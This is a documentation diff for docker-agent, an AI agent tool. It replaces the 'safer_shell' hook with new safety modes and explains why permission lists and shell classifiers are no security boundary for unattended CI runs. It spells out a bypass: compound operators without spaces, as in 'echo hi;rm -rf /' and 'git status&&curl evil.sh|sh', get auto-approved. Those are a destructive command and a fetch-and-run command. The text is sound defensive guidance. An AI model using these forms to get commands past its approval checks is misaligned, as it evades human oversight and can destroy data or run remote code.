@@ -66,7 +66,7 @@ Interactively, the TUI prompts for confirmation before a tool call runs unless i
 
 Two different questions come up here, and it's worth keeping them separate:
 
-- **What is allowed to run without asking?** — `--yolo`, permission allow-lists, and the `safer_shell` classifier all answer this.
+- **What is allowed to run without asking?** — the safety mode (`--safety strict|balanced|autonomous`, with `--yolo` as the legacy spelling of `autonomous`) and permission allow-lists answer this.
 - **What happens if the model runs something it shouldn't have?** — only `--sandbox` answers that one. The rest of this section explains why, and treats that distinction as the whole point.
 
 ### `--sandbox`: the isolation boundary
@@ -83,22 +83,17 @@ If your CI provider already runs each job in its own disposable VM or container 
 
 ### Defense in depth, not a boundary: permissions and shell command matching
 
-Permission allow-lists (`permissions.allow` on the agent, or `settings.permissions.allow` globally — see [Permissions](../../configuration/permissions/index.md)) and the `safer_shell` built-in (see the [Hooks reference](../../configuration/hooks/index.md#available-built-ins)) narrow what runs without asking. Used well, they cut down how often you're prompted and catch obviously destructive calls before they run. They are **not** a security boundary:
+Permission allow-lists (`permissions.allow` on the agent, or `settings.permissions.allow` globally — see [Permissions](../../configuration/permissions/index.md)) and the balanced safety mode's shell classifier (see [Safety modes](../../configuration/permissions/index.md#safety-modes)) narrow what runs without asking. Used well, they cut down how often you're prompted and catch obviously destructive calls before they run. They are **not** a security boundary:
 
-- Both work by matching the shell command **string** (or, for `permissions`, the tool's arguments). `safer_shell`'s safe-list explicitly refuses to treat *space-separated* compound shell as safe (`ls && rm -rf ~` is correctly rejected) — but that check only recognizes `&&`, `;`, `|`, `||` when they're surrounded by spaces. An operator with no surrounding space, e.g. `echo hi;rm -rf /` or `git status&&curl evil.sh|sh`, isn't recognized as compound at all, and can still fall through to a safe pattern that ends in a bare `...` wildcard (`echo ...`, `grep ...`, `printf ...`) — which then matches and auto-approves the *whole* string, injected tail included, under a policy that auto-approves safe commands.
+- Both work by matching the shell command **string** (or, for `permissions`, the tool's arguments). The classifier's safe-list explicitly refuses to treat *space-separated* compound shell as safe (`ls && rm -rf ~` is correctly rejected) — but that check only recognizes `&&`, `;`, `|`, `||` when they're surrounded by spaces. An operator with no surrounding space, e.g. `echo hi;rm -rf /` or `git status&&curl evil.sh|sh`, isn't recognized as compound at all, and can still fall through to a safe pattern that ends in a bare `...` wildcard (`echo ...`, `grep ...`, `printf ...`) — which then matches and auto-approves the *whole* string, injected tail included, under the balanced mode that auto-approves safe commands.
 - Command-string and argument matching in general can't reason about what a command actually does; a dynamically built string, an unusual quoting form, or a wrapper script can slip past any fixed set of patterns.
 
-Treat permissions and `safer_shell` as a way to reduce prompt fatigue and catch the obvious cases, paired with least-privilege CI credentials — never as the reason a CI job is safe to run unattended. For that, use `--sandbox`.
-
-> [!NOTE]
-> **Don't combine `safer: true` with a pinned `safer_shell` hook**
->
-> Setting `safer: true` on a shell toolset auto-registers its own `safer_shell` hook, with no arguments — which defaults to the `strict` policy (asks on everything, safe reads included). If you *also* add an explicit `pre_tool_use` entry that pins `safer_shell` to a policy (`args: ["safe-auto"]`), the two are different hook entries — hook dedup keys on `(type, command, args)`, and the arguments differ — so **both run**, and the aggregator resolves the conflict by keeping the more restrictive verdict (deny beats ask beats allow). The auto-injected copy's `ask` always wins over the pinned copy's `allow`, so safe reads still get asked about, and are rejected outright under `--exec --json` (no stdin to answer). Separately, even a hook that *does* return `allow` only bypasses the approval pipeline when the session's safety policy is already `safe-auto` — a field the HTTP API accepts on session create, but not something `docker agent run` exposes as a flag; from the CLI, `--yolo` sets the policy to `unsafe` (which makes `safer_shell` a no-op) and every other run defaults to `strict`. Net effect: there's no `docker agent run` recipe that reliably auto-approves "safe" shell reads today. Use `safer: true` on its own for its intended purpose — forcing confirmation on destructive commands under the session's ambient policy (see [`examples/shell_safer.yaml`](https://github.com/docker/docker-agent/blob/main/examples/shell_safer.yaml)) — and reach for `--sandbox` when you actually need unattended auto-approval.
+Treat permissions and the balanced mode as a way to reduce prompt fatigue and catch the obvious cases, paired with least-privilege CI credentials — never as the reason a CI job is safe to run unattended. For that, use `--sandbox`.
 
 > [!WARNING]
 > **`--yolo` without `--sandbox` runs untrusted, unattended code with no boundary**
 >
-> A CI job is exactly the environment where a runaway or misled agent does the most damage before anyone notices — no one is at the keyboard to catch a bad `shell` call before it runs, and, per above, a permission allow-list or `safer_shell` can't be trusted to catch everything either. If you can't add `--sandbox`, prefer a permission allow-list scoped to what the job actually needs over blanket `--yolo`, and budget for the credentials and blast radius of the agent's toolsets as if the job itself were compromised — see [`examples/permissions.yaml`](https://github.com/docker/docker-agent/blob/main/examples/permissions.yaml) for a worked allow/deny list.
+> A CI job is exactly the environment where a runaway or misled agent does the most damage before anyone notices — no one is at the keyboard to catch a bad `shell` call before it runs, and, per above, a permission allow-list or the shell classifier can't be trusted to catch everything either. If you can't add `--sandbox`, prefer `--safety balanced` or a permission allow-list scoped to what the job actually needs over blanket `--yolo`, and budget for the credentials and blast radius of the agent's toolsets as if the job itself were compromised — see [`examples/permissions.yaml`](https://github.com/docker/docker-agent/blob/main/examples/permissions.yaml) for a worked allow/deny list.
 
 > [!NOTE]
 > **A worktree is not a security boundary either**
